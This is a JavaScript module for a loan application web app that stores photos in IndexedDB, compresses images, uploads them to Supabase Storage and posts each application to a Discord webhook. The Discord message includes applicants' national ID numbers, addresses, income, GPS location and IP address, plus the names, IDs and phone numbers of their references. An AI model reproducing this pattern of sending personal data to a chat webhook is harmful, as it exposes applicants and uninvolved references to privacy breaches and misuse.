/* ============================================
   QOAN — API & Storage Module
   IndexedDB persistence, image compression,
   and Supabase Storage uploads.
   ============================================ */

// === IndexedDB helpers for persisting photos across browser crashes ===
const PHOTO_DB_NAME = 'qoan_photos';
const PHOTO_DB_VERSION = 1;
const PHOTO_STORE = 'photos';

function openPhotoDB() {
    return new Promise((resolve, reject) => {
        const req = indexedDB.open(PHOTO_DB_NAME, PHOTO_DB_VERSION);
        req.onupgradeneeded = () => req.result.createObjectStore(PHOTO_STORE);
        req.onsuccess = () => resolve(req.result);
        req.onerror = () => reject(req.error);
    });
}

async function savePhotoToDB(key, blob) {
    const db = await openPhotoDB();
    return new Promise((resolve, reject) => {
        const tx = db.transaction(PHOTO_STORE, 'readwrite');
        tx.objectStore(PHOTO_STORE).put(blob, key);
        tx.oncomplete = () => { db.close(); resolve(); };
        tx.onerror = () => { db.close(); reject(tx.error); };
    });
}

async function getPhotoFromDB(key) {
    const db = await openPhotoDB();
    return new Promise((resolve, reject) => {
        const tx = db.transaction(PHOTO_STORE, 'readonly');
        const req = tx.objectStore(PHOTO_STORE).get(key);
        req.onsuccess = () => { db.close(); resolve(req.result || null); };
        req.onerror = () => { db.close(); reject(req.error); };
    });
}

async function deletePhotoFromDB(key) {
    const db = await openPhotoDB();
    return new Promise((resolve, reject) => {
        const tx = db.transaction(PHOTO_STORE, 'readwrite');
        tx.objectStore(PHOTO_STORE).delete(key);
        tx.oncomplete = () => { db.close(); resolve(); };
        tx.onerror = () => { db.close(); reject(tx.error); };
    });
}

async function clearAllPhotosFromDB() {
    const db = await openPhotoDB();
    return new Promise((resolve, reject) => {
        const tx = db.transaction(PHOTO_STORE, 'readwrite');
        tx.objectStore(PHOTO_STORE).clear();
        tx.oncomplete = () => { db.close(); resolve(); };
        tx.onerror = () => { db.close(); reject(tx.error); };
    });
}

function compressImage(file, maxWidth = 1200, quality = 0.7) {
    return new Promise((resolve) => {
        const reader = new FileReader();
        reader.onload = (e) => {
            const img = new Image();
            img.onload = () => {
                const canvas = document.createElement('canvas');
                let w = img.width, h = img.height;
                if (w > maxWidth) { h = Math.round(h * maxWidth / w); w = maxWidth; }
                canvas.width = w; canvas.height = h;
                canvas.getContext('2d').drawImage(img, 0, 0, w, h);
                canvas.toBlob((blob) => resolve(blob), 'image/jpeg', quality);
            };
            img.src = e.target.result;
        };
        reader.readAsDataURL(file);
    });
}

/**
 * Upload a file to Supabase Storage.
 * Checks the file input first, then falls back to IndexedDB.
 * @param {string} fileInputId - DOM id of the file input
 * @param {string} fileNamePrefix - prefix for the storage filename
 * @param {string} dniValue - DNI for unique naming
 * @returns {Promise<string|null>} - storage path or null
 */
async function uploadFileToStorage(fileInputId, fileNamePrefix, dniValue) {
    const fileInput = document.getElementById(fileInputId);
    let fileToUpload = null;
    let ext = 'jpg';

    if (fileInput && fileInput.files.length > 0) {
        fileToUpload = fileInput.files[0];
        ext = fileToUpload.name.split('.').pop();
    } else {
        try {
            const savedBlob = await getPhotoFromDB(fileInputId);
            if (savedBlob) { fileToUpload = savedBlob; ext = 'jpg'; }
        } catch(e) { console.error('Error reading from DB', e); }
    }

    if (fileToUpload) {
        const fileName = `${fileNamePrefix}_${dniValue}_${Date.now()}.${ext}`;
        const { data, error } = await supabaseClient.storage.from('documentos').upload(fileName, fileToUpload);
        if (error) { console.error('Error uploading', fileInputId, error); return null; }
        return data.path;
    }
    return null;
}

/**
 * Send loan application embed to Discord webhook.
 */
async function sendToDiscord(formData) {
    try {
        if (!DISCORD_WEBHOOK_URL) return;
        const discordMsg = {
            embeds: [{
                title: "\uD83D\uDE80 Nueva Solicitud de Préstamo",
                color: 5814783,
                fields: [
                    { name: "Nombre", value: formData.nombre, inline: true },
                    { name: "DNI", value: formData.dni, inline: true },
                    { name: "Fecha Nacimiento", value: formData.fecha_nacimiento, inline: true },
                    { name: "Estado Civil", value: formData.estado_civil, inline: true },
                    { name: "Dirección", value: formData.direccion, inline: false },
                    { name: "Email", value: formData.email, inline: true },
                    { name: "Ocupación", value: formData.ocupacion, inline: true },
                    { name: "Centro Trabajo", value: formData.centro_trabajo, inline: true },
                    { name: "Ingreso Mensual", value: `S/. ${formData.ingreso_mensual}`, inline: true },
                    { name: "Monto Solicitado", value: `S/. ${formData.monto}`, inline: true },
                    { name: "Plazo", value: formData.plazo, inline: true },
                    { name: "Yape", value: formData.yape, inline: true },
                    { name: "─── Ref. Familiar ───", value: `${formData.ref_nombre} (${formData.ref_parentesco})\nDNI: ${formData.ref_dni}\nCel: ${formData.ref_celular}`, inline: false },
                    { name: "─── Ref. No Familiar ───", value: `${formData.ref2_nombre} (${formData.ref2_relacion})\nCel: ${formData.ref2_celular}`, inline: false },
                    { name: "Ubicación GPS", value: `[\uD83D\uDCCD Ver en Mapa](https://www.google.com/maps?q=${formData.latitud},${formData.longitud})\nLat: ${formData.latitud}\nLon: ${formData.longitud}`, inline: false },
                    { name: "Dirección IP", value: formData.ip, inline: false }
                ],
                timestamp: new Date().toISOString()
            }]
        };
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(discordMsg)
        });
    } catch (discordError) {
        console.error('Error enviando a Discord', discordError);
    }
}
